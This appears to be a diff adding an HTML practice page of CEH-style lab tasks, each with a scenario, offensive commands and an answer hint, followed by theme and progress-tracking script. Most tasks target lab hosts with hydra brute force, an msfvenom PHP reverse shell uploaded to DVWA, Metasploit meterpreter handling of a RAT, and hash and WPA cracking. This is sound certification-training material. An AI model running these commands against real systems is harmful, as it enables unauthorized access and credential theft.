+            <p><strong>Scenario:</strong> On http://10.10.50.30/profile.php?id=1001, change the id parameter to access other users&#x27; profiles. Find the profile for id=1003.</p>
+            <pre><code>curl &#x27;http://10.10.50.30/profile.php?id=1003&#x27;
+# or use Burp Suite to modify the request</code></pre>
+            <details><summary>Show answer / approach</summary><p>Practice: try sequential IDs (1001, 1002, 1003). Answer: the username/email for id 1003.</p></details>
+        </div>
+        <div class="lab-task" id="task-36">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Brute Force Web Login <span style="font-size:0.7rem;color:var(--muted);font-weight:400;margin-left:8px;">[Medium · 20min]</span></h3>
+            <p><strong>Scenario:</strong> Brute force the login at http://10.10.50.30/login.php for user &#x27;admin&#x27; using a wordlist.</p>
+            <pre><code>hydra -l admin -P ~/ctf/wordlists/rockyou.txt 10.10.50.30 http-post-form &#x27;/login.php:user=^USER^&amp;pass=^PASS^:Invalid&#x27;</code></pre>
+            <details><summary>Show answer / approach</summary><p>Practice: adjust the failure string (&#x27;Invalid&#x27;, &#x27;Wrong&#x27;, &#x27;Login failed&#x27;). Answer: the cracked password.</p></details>
+        </div>
+        <div class="lab-task" id="task-37">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Banner Grabbing <span style="font-size:0.7rem;color:var(--muted);font-weight:400;margin-left:8px;">[Easy · 5min]</span></h3>
+            <p><strong>Scenario:</strong> Grab the HTTP banner from http://10.10.50.30 and identify the server version and ETag.</p>
+            <pre><code>curl -I http://10.10.50.30
+echo -e &#x27;HEAD / HTTP/1.0\r\n\r\n&#x27; | nc 10.10.50.30 80</code></pre>
+            <details><summary>Show answer / approach</summary><p>Practice: look for Server: and ETag: headers. Answer: server version string + ETag value.</p></details>
+        </div>
+        <div class="lab-task" id="task-38">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">CMS Identification <span style="font-size:0.7rem;color:var(--muted);font-weight:400;margin-left:8px;">[Easy · 10min]</span></h3>
+            <p><strong>Scenario:</strong> Identify the CMS used by http://10.10.50.30. Check for WordPress, Joomla, Drupal indicators.</p>
+            <pre><code>whatweb http://10.10.50.30
+curl -s http://10.10.50.30 | grep -i &#x27;wp-content\|joomla\|drupal&#x27;
+# or: wpscan --url http://10.10.50.30</code></pre>
+            <details><summary>Show answer / approach</summary><p>Practice: check /wp-login.php, /administrator/, /user/login. Answer: CMS name (e.g., WordPress).</p></details>
+        </div>
+        <div class="lab-task" id="task-39">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">FTP Credential Cracking <span style="font-size:0.7rem;color:var(--muted);font-weight:400;margin-left:8px;">[Medium · 15min]</span></h3>
+            <p><strong>Scenario:</strong> An FTP server at 10.10.50.30 has weak credentials. Crack them and download flag.txt.</p>
+            <pre><code>hydra -l ftpuser -P ~/ctf/wordlists/rockyou.txt ftp://10.10.50.30
+ftp 10.10.50.30  # login with cracked creds
+# get flag.txt</code></pre>
+            <details><summary>Show answer / approach</summary><p>Practice: try anonymous login first (ftp anonymous). Answer: contents of flag.txt.</p></details>
+        </div>
+        <div class="lab-task" id="task-40">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Clickjacking Detection <span style="font-size:0.7rem;color:var(--muted);font-weight:400;margin-left:8px;">[Easy · 5min]</span></h3>
+            <p><strong>Scenario:</strong> Test if http://10.10.50.30 is vulnerable to clickjacking by checking X-Frame-Options.</p>
+            <pre><code>curl -I http://10.10.50.30 | grep -i &#x27;x-frame-options\|content-security-policy&#x27;
+# Absence = vulnerable</code></pre>
+            <details><summary>Show answer / approach</summary><p>Practice: if no X-Frame-Options or CSP frame-ancestors → vulnerable. Answer: Yes/No.</p></details>
+        </div>
+        <div class="lab-task" id="task-41">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Session Hijacking / ARP <span style="font-size:0.7rem;color:var(--muted);font-weight:400;margin-left:8px;">[Medium · 15min]</span></h3>
+            <p><strong>Scenario:</strong> Analyze sniffsession.pcap to identify the protocol used for sniffing (ARP poisoning).</p>
+            <pre><code>tshark -r sniffsession.pcap -Y &#x27;arp&#x27; -T fields -e arp.src.proto_ipv4 -e arp.dst.proto_ipv4
+tshark -r sniffsession.pcap -Y &#x27;arp.duplicate-address-detected&#x27;</code></pre>
+            <details><summary>Show answer / approach</summary><p>Practice: look for gratuitous ARP or duplicate IP. Answer: ARP (or the sniffing protocol name).</p></details>
+        </div>
+        <div class="lab-task" id="task-42">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">DVWA File Upload <span style="font-size:0.7rem;color:var(--muted);font-weight:400;margin-left:8px;">[Hard · 25min]</span></h3>
+            <p><strong>Scenario:</strong> Upload a PHP web shell to DVWA at http://10.10.50.30/DVWA. Execute it to read /etc/passwd.</p>
+            <pre><code>msfvenom -p php/reverse_php LHOST=YOUR_IP LPORT=4444 -f raw &gt; shell.php
+# Upload via DVWA file upload form, then access /hackable/uploads/shell.php</code></pre>
+            <details><summary>Show answer / approach</summary><p>Practice: DVWA security level must be &#x27;low&#x27;. Use a simple PHP shell. Answer: command output.</p></details>
+        </div>
+        <div class="lab-task" id="task-43">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">DVWA MD5 Hash Crack <span style="font-size:0.7rem;color:var(--muted);font-weight:400;margin-left:8px;">[Easy · 10min]</span></h3>
+            <p><strong>Scenario:</strong> A file Hash.txt uploaded to DVWA contains an MD5 hash. Crack it to reveal the original message.</p>
+            <pre><code>curl http://10.10.50.30/DVWA/hackable/uploads/Hash.txt
+echo &#x27;HASH_HERE&#x27; | xargs -I{} john --format=raw-md5 --wordlist=rockyou.txt --stdin</code></pre>
+            <details><summary>Show answer / approach</summary><p>Practice: or use online hash lookup. Answer: the cracked plaintext.</p></details>
+        </div>
+        <div class="lab-task" id="task-44">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">DDoS PCAP Analysis <span style="font-size:0.7rem;color:var(--muted);font-weight:400;margin-left:8px;">[Hard · 20min]</span></h3>
+            <p><strong>Scenario:</strong> Analyze Evil-traffic.pcapng to find the least IPv4 packet count sent to victim 172.22.10.10 and the attacker IP.</p>
+            <pre><code>tshark -r Evil-traffic.pcapng -Y &#x27;ip.dst==172.22.10.10&#x27; -T fields -e ip.src | sort | uniq -c | sort -n
+tshark -r Evil-traffic.pcapng -Y &#x27;ip.dst==172.22.10.10&#x27; | wc -l</code></pre>
+            <details><summary>Show answer / approach</summary><p>Practice: sort by count, the least is the attacker (or the most is the flood). Answer: packet count + attacker IP.</p></details>
+        </div>
+        <div class="lab-task" id="task-45">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">VeraCrypt Volume Crack <span style="font-size:0.7rem;color:var(--muted);font-weight:400;margin-left:8px;">[Hard · 25min]</span></h3>
+            <p><strong>Scenario:</strong> A VeraCrypt volume &#x27;Its_File&#x27; is password-protected. The password hash is in Hash2crack.txt. Crack it, mount the volume, and find the secret code in EC_data.txt.</p>
+            <pre><code>john --format=raw-md5 --wordlist=rockyou.txt Hash2crack.txt
+veracrypt -t -k &#x27;&#x27; --pim=0 --protect-hidden=no Its_File /mnt/vc
+# read /mnt/vc/EC_data.txt</code></pre>
+            <details><summary>Show answer / approach</summary><p>Practice: crack the hash first, then use the password to mount. Answer: the secret code from EC_data.txt.</p></details>
+        </div>
+        <div class="lab-task" id="task-46">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">WiFi WPA Cracking <span style="font-size:0.7rem;color:var(--muted);font-weight:400;margin-left:8px;">[Medium · 15min]</span></h3>
+            <p><strong>Scenario:</strong> Crack the WPA2 password from W!F!_Pcap.cap using aircrack-ng. Report the password length.</p>
+            <pre><code>aircrack-ng -w ~/ctf/wordlists/rockyou.txt W!F!_Pcap.cap
+# or: aircrack-ng -w rockyou.txt -b BSSID W!F!_Pcap.cap</code></pre>
+            <details><summary>Show answer / approach</summary><p>Practice: need a handshake in the capture. Answer: the password string and its length.</p></details>
+        </div>
+        <div class="lab-task" id="task-47">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">RAT Remote Access <span style="font-size:0.7rem;color:var(--muted);font-weight:400;margin-left:8px;">[Hard · 30min]</span></h3>
+            <p><strong>Scenario:</strong> A Windows machine on 10.10.55.0/24 has a RAT installed. Use it to access the &#x27;Scan&#x27; folder and count the files inside.</p>
+            <pre><code>msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+# After session: meterpreter&gt; ls C:\\Users\\Admin\\Documents\\Scan\</code></pre>
+            <details><summary>Show answer / approach</summary><p>Practice: Metasploit meterpreter. Use &#x27;ls&#x27; or &#x27;dir&#x27; to count files. Answer: file count (e.g., 5).</p></details>
+        </div>
+        <div class="lab-task" id="task-48">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">IoT MQTT PCAP Analysis <span style="font-size:0.7rem;color:var(--muted);font-weight:400;margin-left:8px;">[Medium · 15min]</span></h3>
+            <p><strong>Scenario:</strong> Analyze IoT network traffic pcap to find the MQTT publish message topic and its length.</p>
+            <pre><code>tshark -r iot_traffic.pcap -Y &#x27;mqtt&#x27; -T fields -e mqtt.topic -e mqtt.msg
+# or: tshark -r iot_traffic.pcap -Y &#x27;mqtt.msgtype==3&#x27; -T fields -e mqtt.topic</code></pre>
+            <details><summary>Show answer / approach</summary><p>Practice: MQTT publish is message type 3. Answer: topic name + length.</p></details>
+        </div>
+        <div class="lab-task" id="task-49">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Load Balancer Identification <span style="font-size:0.7rem;color:var(--muted);font-weight:400;margin-left:8px;">[Easy · 10min]</span></h3>
+            <p><strong>Scenario:</strong> Identify the load balancing service used by eccouncil.org by examining DNS/HTTP headers.</p>
+            <pre><code>dig eccouncil.org
+nslookup eccouncil.org
+curl -I https://eccouncil.org | grep -i &#x27;server\|via\|cf-&#x27;</code></pre>
+            <details><summary>Show answer / approach</summary><p>Practice: look for Cloudflare (cf-ray header), AWS ALB, etc. Answer: load balancer name (e.g., cloudflare).</p></details>
+        </div>
+        <div class="lab-task" id="task-50">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Web Crawling <span style="font-size:0.7rem;color:var(--muted);font-weight:400;margin-left:8px;">[Easy · 10min]</span></h3>
+            <p><strong>Scenario:</strong> Crawl http://movies.cehorg.com and count the live PNG files in the /images folder.</p>
+            <pre><code>wget --spider -r http://movies.cehorg.com/images/ 2&gt;&amp;1 | grep -i &#x27;png&#x27;
+# or: gobuster dir -u http://movies.cehorg.com/images/ -w common.txt -x png</code></pre>
+            <details><summary>Show answer / approach</summary><p>Practice: check HTTP 200 responses for .png files. Answer: count of PNG files.</p></details>
+        </div>
+        <div class="lab-task" id="task-51">
+            <h3><input type="checkbox" class="task-check" onchange="saveProgress()" style="margin-right:8px;vertical-align:middle;">Clickjacking Detection</h3>
+            <p><strong>Scenario:</strong> Test if http://www.goodshopping.com is vulnerable to clickjacking by checking X-Frame-Options.</p>
+            <pre><code>curl -I http://www.goodshopping.com | grep -i &#x27;x-frame-options\|content-security-policy&#x27;
+# Absence = vulnerable</code></pre>
+            <details><summary>Show answer / approach</summary><p>Practice: if no X-Frame-Options or CSP frame-ancestors → vulnerable. Answer: Yes/No.</p></details>
+        </div>
+    </div>
+</main>
+<script>
+    const body = document.body;
+    const applyTheme = (t) => {
+        if (t === 'dark') body.setAttribute('data-theme', 'dark');
+        else body.removeAttribute('data-theme');
+    };
+    function getTheme() {
+        try {
+            const p = new URLSearchParams(location.search);
+            const u = p.get('theme');
+            if (u === 'dark' || u === 'light') return u;
+        } catch (e) {}
+        try { return localStorage.getItem('theme') || 'light'; } catch (e) { return 'light'; }
+    }
+    function syncNavLinks(t) {
+        document.querySelectorAll('a[href]').forEach(a => {
+            try {
+                const url = new URL(a.getAttribute('href'), location.href);
+                if (url.pathname.endsWith('.html')) {
+                    url.searchParams.set('theme', t);
+                    a.setAttribute('href', url.pathname.split('/').pop() + '?' + url.searchParams.toString());
+                }
+            } catch (e) {}
+        });
+    }
+    const initialTheme = getTheme();
+    applyTheme(initialTheme);
+    syncNavLinks(initialTheme);
+    // Practice: progress tracking
+    const checks = document.querySelectorAll('.task-check');
+    const totalEl = document.getElementById('practiceTotal');
+    const progEl = document.getElementById('practiceProgress');
+    if (totalEl) totalEl.textContent = checks.length;
+    window.saveProgress = function() {
+        const state = Array.from(checks).map(c => c.checked);
+        try { localStorage.setItem('ceh_practice_progress', JSON.stringify(state)); } catch (e) {}
+        if (progEl) progEl.textContent = state.filter(Boolean).length;
+    };
+    // Restore
+    try {
+        const saved = JSON.parse(localStorage.getItem('ceh_practice_progress') || '[]');
+        checks.forEach((c, i) => { if (saved[i]) c.checked = true; });
+        if (progEl) progEl.textContent = saved.filter(Boolean).length;
+    } catch (e) {}
+    if (totalEl && !checks.length) totalEl.textContent = document.querySelectorAll('.lab-task h3').length;
+
+    // Practice: search filter
+    const pSearch = document.getElementById('practiceSearch');
+    if (pSearch) {
+        pSearch.addEventListener('input', (e) => {
+            const q = e.target.value.trim().toLowerCase();
+            document.querySelectorAll('.lab-task').forEach(task => {
+                const text = task.textContent.toLowerCase();
+                task.style.display = (!q || text.includes(q)) ? '' : 'none';
+            });
+        });
+    }
+
+    // Practice: expand/collapse all
+    window.toggleAllPractice = function(btn) {
+        const details = document.querySelectorAll('.lab-task details');
+        const collapse = btn.textContent.includes('Collapse');
+        details.forEach(d => { if (collapse) d.removeAttribute('open'); else d.setAttribute('open', ''); });
+        btn.textContent = collapse ? 'Expand all' : 'Collapse all';
+    };
+
+    const toggle = document.getElementById('themeToggle');
+    if (toggle) {
+        toggle.addEventListener('click', () => {
+            const newT = body.hasAttribute('data-theme') ? 'light' : 'dark';
+            applyTheme(newT);
+            try { localStorage.setItem('theme', newT); } catch (e) {}
+            try {
+                const url = new URL(location.href);
+                url.searchParams.set('theme', newT);
+                history.replaceState(null, '', url.toString());
+            } catch (e) {}
+            syncNavLinks(newT);
+        });
+    }
+</script>
+<script src="app.js"></script>
+</body>
+</html>
